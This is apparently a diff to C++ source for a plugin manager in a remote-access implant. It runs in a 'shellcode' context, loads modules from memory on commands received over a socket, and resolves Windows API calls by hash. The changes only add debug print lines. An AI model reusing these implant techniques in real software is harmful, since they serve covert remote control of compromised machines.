@@ -45,9 +45,10 @@ PluginManager::~PluginManager(){
 }
 
 uint PluginManager::run(SHELLCODE_CONTEXT* Context){
+    DebufPrintf("[pm] run \n");
     RPEP client(Context->hSocket,Context->hKey,this);
     protocol = &client;
-    //DebufPrintf("despues de client\n");
+    DebufPrintf("[pm] RPEP init ok \n");
 
     this->Context = Context;
 
@@ -119,6 +120,7 @@ void WINAPI FreeLibraryFromMemory(PFreeLibraryFromMemory freeLib,SHELLCODE_CONTE
 }
 
 bool PluginManager::loadPlugin(RPEP_LOAD_PLUGIN* pluginModule){
+    DebufPrintf("[pm] loadPlugin \n");
     pgetInterface getInterface;
     //HINSTANCE hModule;
     plugin* newPlugin;
@@ -139,13 +141,13 @@ bool PluginManager::loadPlugin(RPEP_LOAD_PLUGIN* pluginModule){
             //Buscamos las funciones exportadas
             getInterface = (pgetInterface)GPA_WRAPPER(newPlugin->Module.ModuleBase,"getInterface");
             if(getInterface && (newPlugin->plugInterface = getInterface())){
-                //DebufPrintf("getInterface\n");
+                DebufPrintf("[pm] getInterface \n");
                 newPlugin->ID = pluginModule->PluginID;
-                //DebufPrintf("pluginPrivate\n");
                 pluginPrivate = new PluginManagerInterfacePrivate(*this,*newPlugin);
                 pluginList = pluginPrivate;
                 result = true;
             }else{
+                DebufPrintf("[pm] getInterface not fund\n");
                 if(!getInterface){
                     uint error = (uint)GetLastError();
                     DebufPrintf("GetProcAddress error: %x(%s)\n",error,
@@ -170,6 +172,7 @@ RPEP *PluginManager::getProtocol(){
 }
 
 bool PluginManager::isPluginLoad(ushort ID){
+    DebufPrintf("[pm] isPluginLoad \n");
     bool result = false;
     if(pluginList && pluginList->getPlugInformation()){
         result = pluginList->getPlugInformation()->ID == ID;
@@ -203,6 +206,7 @@ int PluginManagerInterfacePrivate::setErrorCode(uint code){
 
 
 bool PluginManager::runPluginCMD(ulong pluginID, char *data, uint size){
+    DebufPrintf("[pm] runPluginCMD \n");
     plugin* currentPlugin;
     if((currentPlugin = getPluginById(pluginID))){
          /*char buff[size+1];
@@ -233,6 +237,7 @@ FARPROC WINAPI GetProcAddressByHash(HINSTANCE hModule,ulong hash){
     register PIMAGE_EXPORT_DIRECTORY ExpDir = null;
     register char** ExportNames = null;
 
+    DebufPrintf("[pm] GetProcAddressByHash \n");
     //Comprovamos la marca de DOS
     if(*((ushort*)hModule)==IMAGE_DOS_SIGNATURE){
         //localizamos la cabecera PE
@@ -267,5 +272,6 @@ FARPROC WINAPI GetProcAddressByHash(HINSTANCE hModule,ulong hash){
 }
 
 FARPROC WINAPI GPA_WRAPPER(HMODULE hModule, LPCTSTR lpProcName){
+    DebufPrintf("[pm] GPA_WRAPPER \n");
    return GetProcAddressByHash(hModule, fnv32(lpProcName));
 }
